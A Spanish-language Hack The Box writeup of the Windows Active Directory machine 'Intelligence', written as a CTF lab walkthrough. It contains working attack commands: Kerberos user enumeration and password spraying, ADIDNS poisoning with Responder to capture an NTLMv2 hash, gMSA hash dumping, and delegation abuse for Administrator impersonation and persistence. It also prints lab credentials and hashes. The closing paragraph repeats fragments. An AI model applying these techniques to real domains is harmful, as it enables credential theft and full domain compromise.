---
layout: post
title: Intelligence - Writeup
permalink: /htb/intelligence
tags: [Real, Medium, Windows, Hackthebox, Directorio Activo, SMB, Kerberos, LDAP]
description: Máquina Windows de dificultad media que involucra Directorio Activo.
categories: [Windows, Directorio Activo, Ciberseguridad, Hacking]
---

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-15-39-21.png)

Máquina Windows de dificultad **media** un poco revoltosa y que involucra **Directorio Activo**. 

La máquina aporta un gran conocimiento acerca de diversoas herramientas de explotacion en entornos AD (Active Directory), así como una parte donde tenemos que hacernos nuestro propio script para enumerar y analizar unos archivo **.PDF**.

Lo principal de la máquina es enumerar, enumerar y... enumerar. Hay unas partes que son un poco rebuscadillas... Vamos a ello!

# Índice
- [Enumeración](#1)
  - [Escaneo de puertos con nmap](#2)
- [Fase de reconocimiento](#3)
  - [Reconocimiento de la Web](#4)
  - [Investigando unos archivos PDF sospechosos](#5)
  - [Analizando los metadatos de uno de los PDF y validando un posible usuario](#6)
  - [Enumerando más archivos PDF y obteniendo una lista de usuarios válidos](#7)
  - [Investigando el contenido de los PDF](#8)
  - [Obteniendo credenciales válidas como uno de los usuarios del Dominio](#9)
  - [Enumerando diferentes servicios como uno de los usuarios del Dominio](#10)
- [Obteniendo acceso como Administrador](#11)
  - [Enumerando la infraestructura del dominio](#12)
  - [Encontrando un script y aprovechándonos de el para obtener las credenciales de un usuario con más privilegios](#13)
  - [Jugando con el equipo 'svc_int' para impersonar al usuario Administrador](#14)
  - [Consiguiendo el TGT del usuario Administrador y obteniendo acceso a la máquina como este](#15)
- [Mi opinión sobre la máquina](#16)

# Enumeración <a id=1></a>

## Escaneo de puertos con nmap <a id=2></a>

Empezamos escaneando los puertos abiertos de la máquina, así como los servicios que corren en cada uno de estos y sus versiones:

```bash
$ nmap -p- --open -n -vvv --min-rate 5000 -Pn 10.10.10.248 -oG ports
...
$ nmap -p53,80,88,135,139,445,464,593,636,3268,3269,5985,9389,49667,4969[9/9]92,49704,49713,59517 -sCV -n -vvv 10.10.10.248 -oN s
...
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus      
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
...
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-01-03 08:55:44Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127                       
464/tcp   open  kpasswd5?     syn-ack ttl 127                            
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
...
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
...
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
...
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49713/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59517/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

Hay de todo abierto aquí... 

| Puerto | Servicio |
| ------ | -------- |
| 53 | DNS |
| 80 | HTTP (Web) |
| 88 | Kerberos |
| 135 | RPC |
| 139 | NetBIOS |
| 445 | SMB |
| 464 | ? |
| 593 | RPC Over HTTP |
| 636, 3268, 3269 | LDAP |

Los demás puertos de momento no nos interesan mucho...

Antes de continuar, aprovechándonos que el SMB está expuesto, veamos contra que nos enfrentamos:

```bash
$ crackmapexec smb 10.10.10.248
SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```

Okey, estamos ante un Windows 10. Esto siempre hay que validarlo, puesto que versiones más antiguas de Windows podrían ser vulnerables al Eternalblue (Podemos ganar directamente acceso a la máquina).

Sigamos con el reconocimiento...

<br>

# Fase de reconocimiento <a id=3></a>

## Reconocimiento de la Web <a id=4></a>

Vamos a empezar por la Web:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-19-41.png)

De momento nada interesante, el servicio parece actualizado, pero, como siempre, hay que verificar...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-20-46.png)

Vamos a entrar a la Web desde el navegador:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-23-58.png)

Vemos un campo para introducir un correo electrónico, pero no hace nada...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-25-28.png)

Más abajo, vemos dos botones que parecen redirigirnos a unos archivos PDF:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-27-53.png)

Si entramos, veremos efectivamente que nos cargan dos PDFs, pero con el típico texto en latín (Lorem ipsum, dolor y... ¿Porros?)

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-29-52.png)

Y ojo, porque esto puede estar aquí para despistar... ¡O no!

## Investigando unos archivos PDF sospechosos <a id=5></a>

Si miramos más allá, podremos darnos cuenta de que no solo existen estos dos PDF, sino que hay más! Para comprobarlo, basta con cambiar un poco el nombre del archivo, en concreto las fechas... (También bastaría con tratar de listar los archivos del directorio, pero en este caso, no tenemos capacidad de Directory Listing).

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-31-59.png)

Ahí podemos ver que hay más archivos ocultos... Definitivamente, esto no está aquí por estar...

## Analizando los metadatos de uno de los PDF y validando un posible usuario <a id=6></a>

Si descargamos alguno de estos archivos y vemos sus metadatos...

> Los metadatos de un archivo son una serie de información que puede ser de mucha utilidad. Por ejemplo, las fotografías suelen guardar información de la cámara con la que han sido hechas, a que hora, y donde han sido hechas (Coordenadas **exactas**). No solo están en las fotos, sino que están en casi todos los archivo, y, en ocasiones, pueden contener información crucial.

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-38-56.png)

Tenemos un nombre! Que podría ser aleatorio, o no... Como Kerberos está expuesto, vamos a ver si es válido...

Para ello, usaremos la herramienta [kerbrute](https://github.com/ropnop/kerbrute) y su opción `userenum`:

Antes de nada, nos pedirá una wordlist con los usuarios (En este caso solamente uno), así que añadimos el nombre a un archivo.

```bash
$ ./kerbrute userenum --dc 10.10.10.248 --domain intelligence.htb /path/to/file.txt
```

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-48-13.png)

El usuario es válido! Si comprobamos los metadatos de algún otro archivo, podremos ver que son diferentes y que también son válidos!

## Enumerando más archivos PDF y obteniendo una lista de usuarios válidos <a id=7></a>

En vista de esto y de que puede que haya más archivos ocultos, vamos a hacer un pequeño Script en Bash para tratar de enumerarlos...

```bash
#!/bin/bash

for i in $(seq 2020 2021);do
	for mes in $(seq -w 1 12);do
		for dia in $(seq -w 1 31);do
			result=$(curl -s -X GET -I http://10.10.10.248/documents/${i}-${mes}-${dia}-upload.pdf|grep "HTTP"|grep -v 404 | awk '{print $2}')
			if [[ $result == 200 ]]
			then
			        echo "http://10.10.10.248/documents/${i}-${mes}-${dia}-upload.pdf"
			fi
		done
	done
done
```

Lo ejecutamos y...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-02-56-15.png)

Bingo! Efectivamente, hay más archivos. Vamos a redirigir el output a un archivo para poder trabajar más cómodamente. Esto lo hacemos con `> ../content/urls.txt`, donde `../content/urls.txt` es el archivo al que el output será redirigido.

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-00-18.png)

Vemos que hay 99 archivos más, toca descargarlos...

Para ello, creamos un nuevo directorio, nos movemos a este y ejecutamos lo siguiente para descargar cada uno de estos archivos:

```bash
$ wget --input-file ../urls.txt
```

Y esperamos a que se descarguen...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-06-00.png)

Listo, ahora vamos a tratar de obtener el listado de los usuarios que han creado todos estos documentos:

```bash
$ exiftool * | grep Creator | awk '{print $3}'| sort | uniq 
...
```

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-09-35.png)

| Comando | Descripción |
| ------- | ----------- |
| exiftool * | Lista los metadatos de cada archivo en el directorio actual |
| grep Creator | Filtra por las líneas que contentgan la palabra 'Creator' |
| awk '{print $3}' | Imprime la tercera 'palabra' (Funciona similar a los argumentos) |
| sort | Ordenarlo alfabeticamente |
| uniq | Eliminar repeticiones |

Con esto, debería quedarnos un listado de 30 usuarios que, si metemos en un archivo y validamos de nuevo...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-15-15.png)

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-15-32.png)

Válido, válido y válido! Pero ninguno parece ser `ASREPRoasteable`. Lo guardamos para más adelante.

> Que un usuario sea ASREPRoasteable significa que podemos obtener su hash y tratar de crackearlo de manera offline (Usando herramientas como Hashcat o John) para obtener su contraseña. Esto solo pasa cuando el usuario posee el atributo `DONT_REQ_PREAUTH`.

Antes de probar otros métodos, vamos a investigar un poco los contenidos de los PDF en busca de alguna pista o algo que se hayan podido dejar...

## Investigando el contenido de los PDF <a id=8></a>

Para ello, evidentemente no vamos a abrir uno a uno manualmente ,sino que, gracias a una librería de Python llamada `textract`, podremos imprimir el contenido de cada archivo automáticamente. Let's go! 😄

Antes de nada, vamos a crear un `Array` que almacene todos los nombres de los archivos para poder trabajar bien con ellos en Python:

```bash
$ ls pdfs | xargs | sed 's/ /\", \"/g'
```

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-26-54.png)

| Comando | Descripción |
| ------- | ----------- |
| ls pdfs | Lista los archivos del directorio pdfs |
| xargs | Para que salgan en un formato más cómodo para jugar con substituciones |
| sed 's/ /\", \"/g' | Substituimos los espacios por `", "` |

Nos copiamos todo esto (podemos añadirle un `|xclip -sel clip` para copiárnoslo directamente)

Y creamos un archivo .py y se lo añadimos de la siguiente manera, no sin antes descargar la librería `textract`

```bash
$ pip3 install textract
```

```python
#!/usr/bin/python3

import textract

files = ["2020-01-01-upload.pdf", "2020-01-02-upload.pdf", "2020-01-04-upload.pdf", "2020-01-10-upload.pdf", "2020-01-20-upload.pdf", "2020-01-22-upload.pdf", "2020-01-23-upload.pdf", "2020-01-25-upload.pdf", "2020-01-30-upload.pdf", "2020-02-11-upload.pdf", "2020-02-17-upload.pdf", "2020-02-23-upload.pdf", "2020-02-24-upload.pdf", "2020-02-28-upload.pdf", "2020-03-04-upload.pdf", "2020-03-05-upload.pdf", "2020-03-12-upload.pdf", "2020-03-13-upload.pdf", "2020-03-17-upload.pdf", "2020-03-21-upload.pdf", "2020-04-02-upload.pdf", "2020-04-04-upload.pdf", "2020-04-15-upload.pdf", "2020-04-23-upload.pdf", "2020-05-01-upload.pdf", "2020-05-03-upload.pdf", "2020-05-07-upload.pdf", "2020-05-11-upload.pdf", "2020-05-17-upload.pdf", "2020-05-20-upload.pdf", "2020-05-21-upload.pdf", "2020-05-24-upload.pdf", "2020-05-29-upload.pdf", "2020-06-02-upload.pdf", "2020-06-03-upload.pdf", "2020-06-04-upload.pdf", "2020-06-07-upload.pdf", "2020-06-08-upload.pdf", "2020-06-12-upload.pdf", "2020-06-14-upload.pdf", "2020-06-15-upload.pdf", "2020-06-21-upload.pdf", "2020-06-22-upload.pdf", "2020-06-25-upload.pdf", "2020-06-26-upload.pdf", "2020-06-28-upload.pdf", "2020-06-30-upload.pdf", "2020-07-02-upload.pdf", "2020-07-06-upload.pdf", "2020-07-08-upload.pdf", "2020-07-20-upload.pdf", "2020-07-24-upload.pdf", "2020-08-01-upload.pdf", "2020-08-03-upload.pdf", "2020-08-09-upload.pdf", "2020-08-19-upload.pdf", "2020-08-20-upload.pdf", "2020-09-02-upload.pdf", "2020-09-04-upload.pdf", "2020-09-05-upload.pdf", "2020-09-06-upload.pdf", "2020-09-11-upload.pdf", "2020-09-13-upload.pdf", "2020-09-16-upload.pdf", "2020-09-22-upload.pdf", "2020-09-27-upload.pdf", "2020-09-29-upload.pdf", "2020-09-30-upload.pdf", "2020-10-05-upload.pdf", "2020-10-19-upload.pdf", "2020-11-01-upload.pdf", "2020-11-03-upload.pdf", "2020-11-06-upload.pdf", "2020-11-10-upload.pdf", "2020-11-11-upload.pdf", "2020-11-13-upload.pdf", "2020-11-24-upload.pdf", "2020-11-30-upload.pdf", "2020-12-10-upload.pdf", "2020-12-15-upload.pdf", "2020-12-20-upload.pdf", "2020-12-24-upload.pdf", "2020-12-28-upload.pdf", "2020-12-30-upload.pdf", "2021-01-03-upload.pdf", "2021-01-14-upload.pdf", "2021-01-25-upload.pdf", "2021-01-30-upload.pdf", "2021-02-10-upload.pdf", "2021-02-13-upload.pdf", "2021-02-21-upload.pdf", "2021-02-25-upload.pdf", "2021-03-01-upload.pdf", "2021-03-07-upload.pdf", "2021-03-10-upload.pdf", "2021-03-18-upload.pdf", "2021-03-21-upload.pdf", "2021-03-25-upload.pdf", "2021-03-27-upload.pdf"]
```

Luego de esto, añadimos las siguientes líneas:

```python
for file in files:
        text = textract.process(file, method='pdfminer')
        print('\n\n')
        print(text.decode())
```

Nos posicionamos en el directorio donde los PDF y lo ejecutamos:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-34-29.png)

Esto nos mostrará una gran cantidad de texto... Aislado a los ¿Porros? y a los demás textos en Latín, podremos encontrar cierta info...

> Podemos filtrar por palabras claves del Inglés tal y como se ve en la imagen para encontrar esta clase de cosas más rápido.

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-38-09.png)

Podemos redirigir el Output a un archivo y filtrar para ver el texto completo y, finalmente, obtendremos estos dos mensajes:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-40-59.png)

- Uno nos dice que existe una contraseña por defecto que todos deberían cambiar lo antes posible (Y que, inevitablemente, siempre estará el típico/a que no la cambie 😋).
- El otro nos dice que hay un script que notifica las caídas de la Web y algo de los service accounts. Este nos lo guardamos pa' luego.

Tenemos una contraseña, una lista con 30 usuarios y una herramienta capaz de averiguar si esa contraseña es válida para alguno de los usuarios: no se hable más. 😁

## Obteniendo credenciales válidas como uno de los usuarios del Dominio <a id=9></a>

Vamos a utilizar de nuevo la herramienta kerbrute, pero esta vez con la opción `passwordspray`, la cual probará una contraseña contra una wordlist de usuarios:

```bash
$ ./kerbrute passwordspray --dc 10.10.10.248 -d intelligence.htb /path/to/file.txt 'NewIntelligenceCorpUser9876'
```

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-52-19.png)

OJO! Tenemos credenciales de una tal 'Tiffany.Molina'!

## Enumerando diferentes servicios como uno de los usuarios del Dominio <a id=10></a>

Ahora que tenemos credenciales válidas ('Tiffany.Molina:NewIntelligenceCorpUser9876'), vamos a tratar de enumerar las posibles vías que tenemos para comprometer la máquina:

No nos sale el `Pwn3d`, pero el usuario es válido.

> Si en `crackmapexec` nos sale el `Pwn3d`, significa que el usuario tiene privilegios de Administrador de Dominio y, por lo tanto, podremos dumpear la `SAM` (Base de datos donde se encuentran las contraseñas Hasheadas de los usuarios), obtener acceso como `NT Authority/System`, entre otras cosas.

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-03-59-22.png)

Vamos a ver por `winrm`:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-04-01-53.png)

El usuario no parece válido, por lo tanto, no podemos obtener acceso por ahí...

Vamos a investigar con `smbmap` los recursos a los que tenemos acceso:

```bash
$ smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
```

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-00-52.png)

Tenemos acceso a 5 recursos, entre ellos hay uno que se llama Users: vamos a conectarnos a ese recurso a ver...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-02-32.png)

Efectivamente, parece que tenemos acceso al directorio Users: Veamos si podemos pillar la Flag.

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-04-09.png)

Si nos lo tratamos de descargar con el parámetro `--download`:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-06-05.png)

Ahí está!

<br>

# Obteniendo acceso como Administrador <a id=11></a>

De momento no podemos obtener acceso como tal a la máquina: no podemos acceder por WinRM (Mediante Evil-winrm), el usuario no es ni ASREPRoasteable ni Kerberoasteable, ni podemos entrar por `psexec.py`...

Vamos a enumerar toda la infraestructura del dominio con la herramienta `ldapdomaindump`:

<br>

## Enumerando la infraestructura del dominio <a id=12></a>

Nos dirigimos al directorio `/var/www/html/`

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-17-14.png)

Y, tras ejecutarlo, nos abrimos un servidor Apache para poder ver el contenido desde el navegador:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-19-19.png)

Ahí tenemos mucha información relevante del dominio. Vamos a ver que hay por aquí 😋

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-21-53.png)

Tenemos otro equipo en la Red! 

Si vemos los usuarios por grupos, vemos que hay algunos que parecen privilegiados sobre otros. Y que, si recordamos bien, hay un mensaje que dice algo sobre uno de ellos: Ted.Graves.

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-31-00.png)

## Encontrando un script y aprovechándonos de el para obtener las credenciales de un usuario con más privilegios <a id=13></a>

Según nos dice ahí, existe un script para comprobar si hay problemas en la Web. Vamos a ver si por algún casual está en algún recurso en SMB:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-33-05.png)

No tenemos permiso para ver su Directorio, pero, si miramos los recursos...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-34-41.png)

Ahí está! Vamos a descargarlo a ver.

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-36-04.png)

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Okey, vamos a ver lo que hace a ver si nos podemos aprovechar de esto para avanzar...

- Esto se conecta a todos los recursos (x.intelligence.htb) que empiecen por `web` y le envía una petición HTTP para revisar su estado. Por lo que se ve (Y entiendo 😁), usa los DNS internos del dominio. Si investigamos un poco sobre esto, encontramos lo siguiente:

> [ADIDNS poisoning](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing)

Según este articulo, podemos envenenar los DNS del AD con la herramienta dnstool.py:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-13-50-23.png)

Parece haber funcionado... Vamos a abrirnos el responder, pero antes, paramos el servicio apache con `service apache2 stop`:

```bash
$ responder -I tun0 
```

Toca esperar 5 minutos, como nos indica el mensaje... 😄

Vemos que efectivamente, nos llega el hash NTLMv2:

```bash
Ted.Graves::intelligence:948b50cc6b928773:09825B0C13F7B0422598EFBB84BDD60E:0101000000000
000EC3CDFA84800D801E7BCAE4200CC5ACE0000000002000800590046004A004A0001001E00570049004E002D004900510037004F003400530059005400560051004500040
01400590046004A004A002E004C004F00430041004C0003003400570049004E002D004900510037004F0034005300590054005600510045002E00590046004A004A002E004
C004F00430041004C0005001400590046004A004A002E004C004F00430041004C0008003000300000000000000000000000002000005F00FA197F61D59D67A929E859C0C10FF736995E13CC307059B5CD3E4B78123E0A001000000000000000000000000000000000000900340048005400540050002F007700650062006F002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Lo metemos en un archivo y...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-14-04-16.png)

Al parecer tenemos credenciales de un usuario con más privilegios que el anterior: `Ted.Graves:Mr.Teddy`. Vamos a ver que podemos hacer:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-14-08-59.png)

El usuario es válido, pero seguimos igual... Vamos a seguir enumerando...

## Jugando con el equipo 'svc_int' para impersonar al usuario Administrador <a id=14></a>

Si recordamos bien, hay otro equipo con el que tal vez ahora podamos hacer algo con él... Vamos a ver que es:

Si miramos las flags, vemos que tiene la `TRUSTED_TO_AUTH_FOR_DELEGATION`. Esto nos permite obtener el Ticket del usuario administrador, siempre y cuando tengamos acceso a un usuario capaz de hacerlo (Es decir, que se le deleguen esos privilegios).

Veamos si con el usuario que tenemos ahora (Ted.Graves) podemos obtener el hash de `svc_int` para poder conseguir el Ticket del usuario Administrador

> Con el ticket de un usuario, podemos obtener acceso a la máquina como este.

Para ello, usaremos la herramienta `gMSADumper.py`. Peeero... Hay una cosa que tenemos que hacer antes...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-14-53-35.png)

Tenemos que sincronizar la hora de los dos equipos para que funcione... 😐

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-14-56-24.png)

> Importante desactivar la opción de que se nos sincronice automáticamente con nuestra zona horaria!

Ahora, probamos la herramienta...

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-14-58-22.png)

Tenemos el hash! Hash que, por más que probemos con herramientas como `john` o `hashcat`, no podremos romper... Así que vamos a tratar de conseguir el Ticket del usuario Administrador:

Pero antes necesitamos un SPN (Service Principal Name). Para conseguirlo, usamos `bloodhound-python`:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-14-31-01.png)

Y, si miramos en el archivo `*_computers.json` (Todo lo que acabe por `_computers.json`) con `jq` para verlo bien, podremos ver ese SPN:

```bash
$ cat *_computers.json | jq
```

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-15-05-15.png)

## Consiguiendo el TGT del usuario Administrador y obteniendo acceso a la máquina como este <a id=15></a>

Prosigamos...

```bash
$ getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes ':09829b63fdf7bd623fc3f4f7b3cc9905' -no-pass -dc-ip 10.10.10.248 intelligence.htb/svc_int
```

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-15-09-21.png)

Ya tenemos el TGT (Ticket Granting Ticket) del usuario Administrador! Ahora solo falta logearnos con él:

```bash
$ KRB5CCNAME=Administrator.ccache impacket-psexec intelligence.htb/Administrator@dc.intelligence.htb -target-ip 10.10.10.248 -no-pass -k
```

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-15-16-21.png)

Estamos dentro! 😋

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-15-17-05.png)

Adicionalmente, podemos crearnos un usuario dentro del dominio y otorgarle permisos de Administrador para poder seguir haciendo travesuras:

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-15-37-51.png)

![La imagen no ha podido ser cargada. Pls recarga la página!](/img/intelligence/2022-01-03-15-39-26.png)

<br>

<br>

# Mi opinión sobre la máquina <a id=16></a>

Creo que para ser medium está algo dificilita (Sobre todo si es de tus primeras máquinas que involucran AD 😁), pero el conocimiento que me ha aportado ha sido enorme! El hecho de que hayamos tenido que ir enumerándolo todo para utilizarlo más adelante me ha gustado! Sin duda, la recomiendo al 100%. que ir enumerándolo todo para utilizarlo más adelante me ha gustado! Sin duda, la recomiendo al 100%.do! Sin duda, la recomiendo al 100%.
